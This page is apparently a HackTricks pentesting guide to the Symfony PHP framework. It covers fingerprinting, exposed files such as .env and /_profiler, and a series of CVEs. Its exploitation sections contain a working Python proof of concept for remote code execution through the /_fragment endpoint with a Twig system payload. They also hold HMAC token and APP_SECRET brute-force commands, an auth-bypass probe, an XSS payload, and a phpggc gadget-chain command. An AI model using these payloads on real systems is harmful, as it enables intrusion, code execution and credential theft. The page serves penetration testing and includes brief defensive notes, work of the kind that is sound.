---
title: "Symfony"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/symphony.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Recon & Enumeration

### Finger-printing

- HTTP response headers: `X-Powered-By: Symfony` ,`X-Debug-Token` ,`X-Debug-Token-Link` or cookies starting with`sf_redirect` ,`sf_session` ,`MOCKSESSID` .
- Source code leaks (`composer.json` ,`composer.lock` ,`/vendor/…` ) often reveal the exact version:```
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
- Public routes that only exist on Symfony:
  - `/_profiler` (Symfony**Profiler** & debug toolbar)
  - `/_wdt/<token>` (“Web Debug Toolbar”)
  - `/_error/{code}.{_format}` (pretty error pages)
  - `/app_dev.php` ,`/config.php` ,`/config_dev.php` (pre-4.0 dev front-controllers)
- Wappalyzer, BuiltWith or ffuf/feroxbuster wordlists: `symfony.txt` → look for`/_fragment` ,`/_profiler` ,`.env` ,`.htaccess` .

### [Interesting files & endpoints](#interesting-files--endpoints)

| Path | Why it matters |
|---|---|
| `/.env` ,`/.env.local` ,`/.env.prod` | Frequently mis-deployed → leaks `APP_SECRET` , DB creds, SMTP, AWS keys |
| `/.git` ,`.svn` ,`.hg` | Source disclosure → credentials + business logic |
| `/var/log/*.log` ,`/log/dev.log` | Web-root mis-configuration exposes stack-traces |
| `/_profiler` | Full request history, configuration, service container, **APP_SECRET** (≤ 3.4) |
| `/_fragment` | Entry point used by ESI/HInclude.  Abuse possible once you know `APP_SECRET` |
| `/vendor/phpunit/phpunit/phpunit` | PHPUnit RCE if accessible (CVE-2017-9841) |
| `/index.php/_error/{code}` | Finger-print & sometimes leak exception traces |

## [High-impact Vulnerabilities](#high-impact-vulnerabilities)

### [1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)](#1-app_secret-disclosure--rce-via-_fragment-aka-secret-fragment)

`/_fragment` (aka “secret-fragment”)
- **CVE-2019-18889** originally, but*still* appears on modern targets when debug is left enabled or`.env` is exposed.
- Once you know the 32-char `APP_SECRET` , craft an HMAC token and abuse the internal`render()` controller to execute arbitrary Twig:```
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
    'template': '@app/404.html.twig',
    'filter': 'raw',
    '_format': 'html',
    '_locale': 'en',
    'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
- Excellent write-up & exploitation script: Ambionics blog (linked in References).<sup>[\[1\]](#references)</sup>

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)

**CVE-2025-64500**(HttpFoundation)

- Affects versions below 5.4.50, 6.4.29 and 7.3.7. Path normalization could drop the leading `/` , breaking access-control rules that assume`/admin` etc.
- Quick test: `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → if it reaches admin routes without auth, you found it.
- Patch by upgrading `symfony/http-foundation` or the full framework to the fixed patch level.<sup>[\[5\]](#references)</sup>

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)

**CVE-2026-24739**(Process)

- Affects versions below 5.4.51, 6.4.33, 7.3.11, 7.4.5 and 8.0.5 on Windows when PHP is run from MSYS2 (Git-Bash, mingw). `Process` fails to quote`=` leading to corrupted paths; destructive commands (`rmdir` ,`del` ) may target unintended dirs.<sup>[\[4\]](#references)</sup>
- If you can upload a PHP script or influence Composer/CLI helpers that call `Process` , craft arguments with`=` (e.g.`E:/=tmp/delete` ) to cause path re-write.

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)

**CVE-2024-50340**(Runtime)

- When `register_argv_argc=On` and using non-SAPI runtimes, crafted query strings could flip`APP_ENV` /`APP_DEBUG` via`argv` parsing. Patched in 5.4.46/6.4.14/7.1.7.<sup>[\[6\]](#references)</sup>
- Look for `/?--env=prod` or similar being accepted in logs.

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)

**CVE-2024-50345**(HttpFoundation)

- Special characters in the URI were not validated the same way browsers do, enabling redirect to attacker-controlled domains. Fixed in 5.4.46/6.4.14/7.1.7.<sup>[\[7\]](#references)</sup>

### 6. Symfony UX attribute injection – **CVE-2025-47946**

**CVE-2025-47946**

- `symfony/ux-twig-component` &`symfony/ux-live-component` before**2.25.1** render`{{ attributes }}` without escaping → attribute injection/XSS. If the app lets users define component attributes (admin CMS, email templating) you can chain to script injection.<sup>[\[3\]](#references)</sup>
- Update both packages to 2.25.1+. As a manual exploit, place JS in an attribute value passed to a custom component and trigger rendering.

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)

**CVE-2024-51736**(Process)

- The `Process` component searched the current working directory**before**`PATH` on Windows.  An attacker able to upload`tar.exe` ,`cmd.exe` , etc. in a writable web-root and trigger`Process` (e.g. file extraction, PDF generation) gains command execution.<sup>[\[2\]](#references)</sup>
- Patched in 5.4.50, 6.4.14, 7.1.7.

### 8. Session-Fixation – **CVE-2023-46733**

**CVE-2023-46733**

- Authentication guard reused an existing session ID after login.  If an attacker sets the cookie **before** the victim authenticates, they hijack the account post-login.

### 9. Twig sandbox XSS – **CVE-2023-46734**

**CVE-2023-46734**

- In applications that expose user-controlled templates (admin CMS, email builder) the `nl2br` filter could be abused to bypass the sandbox and inject JS.

### 10. Symfony 1 gadget chains (still found in legacy apps)

- `phpggc symfony/1 system id` produces a Phar payload that triggers RCE when an unserialize() happens on classes such as`sfNamespacedParameterHolder` .  Check file-upload endpoints and`phar://` wrappers.

[PHP - Deserialization + Autoload Classes](../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.html)

## Exploitation Cheat-Sheet

### Calculate HMAC token for `/_fragment`

`/_fragment````
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### [Bruteforce weak `APP_SECRET`](#bruteforce-weak-app_secret)

`APP_SECRET````
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### RCE via exposed Symfony Console

If `bin/console` is reachable through `php-fpm` or direct CLI upload:

```
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
Use deserialization gadgets inside the cache directory or write a malicious Twig template that will be executed on the next request.

### Probe PATH_INFO bypass quickly (CVE-2025-64500)

```
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX attribute injection (CVE-2025-47946)

```
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
If the rendered output echoes the attribute unescaped, XSS succeeds. Patch to 2.25.1+.

## Defensive notes

1. **Never deploy debug** (`APP_ENV=dev` ,`APP_DEBUG=1` ) to production; block`/app_dev.php` ,`/_profiler` ,`/_wdt` in the web-server config.
2. Store secrets in env vars or `vault/secrets.local.php` ,*never* in files accessible through the document-root.
3. Enforce patch management – subscribe to Symfony security advisories and keep at least the LTS patch-level (5.4.x until Nov 2025, 6.4 until Nov 2027, 7.4 until Nov 2029).
4. If you run on Windows, upgrade immediately to mitigate CVE-2024-51736 & CVE-2026-24739 or add a `open_basedir` /`disable_functions` defence-in-depth.

### Useful offensive tooling

- **ambionics/symfony-exploits** – secret-fragment RCE, debugger routes discovery.
- **phpggc** – Ready-made gadget chains for Symfony 1 & 2.
- **sf-encoder** – small helper to compute`_fragment` HMAC (Go implementation).

## References
